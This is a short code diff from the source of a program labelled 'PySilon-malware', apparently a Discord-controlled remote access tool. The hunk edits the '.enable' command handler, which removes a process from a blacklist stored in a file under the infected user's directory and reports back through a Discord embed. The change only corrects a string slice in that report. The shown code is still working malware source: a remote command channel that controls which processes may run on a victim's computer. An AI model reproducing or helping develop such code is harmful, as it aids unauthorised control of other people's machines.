@@ -161,7 +161,7 @@ elif message.content[:7] == '.enable':
             disabled_processes_list.pop(disabled_processes_list.index(message.content[8:]))
             with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                 disabled_processes.write('\n'.join(disabled_processes_list))
-            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[9:]} has been removed from process blacklist```', colour=discord.Colour.green())
+            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[8:]} has been removed from process blacklist```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         else:
